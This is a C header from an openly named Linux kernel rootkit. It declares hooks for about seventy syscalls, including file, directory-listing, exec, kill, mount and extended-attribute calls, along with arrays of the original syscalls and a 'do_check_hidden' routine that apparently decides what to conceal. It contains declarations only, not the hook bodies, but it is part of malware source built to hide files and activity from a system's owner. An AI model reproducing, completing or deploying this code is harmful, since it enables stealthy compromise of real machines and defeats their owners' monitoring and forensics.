#ifndef _ROOTKIT_SYSCALL_HOOKS_H_
#define _ROOTKIT_SYSCALL_HOOKS_H_

#include "hooking.h"
#include "macro_utils.h"
#include "utils.h"
#include <asm/unistd.h>

/* All hooked syscalls */
#define HOOKED_SYSCALLS                                                                     \
    read, pread64, write, sendfile,                              /* read_write.c */         \
        open, openat, openat2, creat, truncate, open_tree,       /* open.c */               \
        access, faccessat, faccessat2,                           /* access.c */             \
        stat, lstat, newfstatat, statx, readlink, readlinkat,    /* stat.c */               \
        chdir, chroot, chmod, fchmodat, chown, lchown, fchownat, /* chx.c */                \
        uselib, execve, execveat,                                /* exec.c */               \
        getdents, getdents64,                                    /* getdents.c */           \
        kill,                                                    /* kill.c */               \
        link, linkat, unlink, unlinkat, rename, renameat, renameat2, mkdir, mkdirat, mknod, \
        mknodat, rmdir, name_to_handle_at,                                    /* name.c */  \
        mount, umount2, move_mount, pivot_root, mount_setattr, statfs, sysfs, /* mount.c */ \
        swapon, swapoff,                                                      /* swap.c */  \
        setxattr, lsetxattr, getxattr, lgetxattr, listxattr, llistxattr, removexattr,       \
        lremovexattr,                       /* xattr.c */                                   \
        acct, quotactl,                     /* kernel.c */                                  \
        utime, utimes, utimensat, futimesat /* utimes.c */

#define P_SYSCALL_HOOKS p_syscall_hooks /* Variable name for the syscall hook array */
#define P_ORIG_SYSFUNS  p_orig_sysfuns  /* Variable name for the original syscall functions array */
#define P_SIG_HANDLERS  p_sig_handlers  /* Variable name for the signal handler array */

#define AT_LOOKUP_PARENTS 0x10000000 // Lookup only parent directories

// Array of the original syscall function references.
extern sysfun_t P_ORIG_SYSFUNS[__NR_syscalls];

// Array of the syscall hooks.
extern hook_t P_SYSCALL_HOOKS[];

// Array of the signal handlers.
extern const signal_handler_t P_SIG_HANDLERS[];

DECLARE_HOOK_HANDLERS(HOOKED_SYSCALLS)

long do_check_hidden(const sysfun_t orig_func, struct pt_regs *const p_regs, const int i32_dfd,
                     const char __user *const s_filename, const int i32_at_flags);

#endif
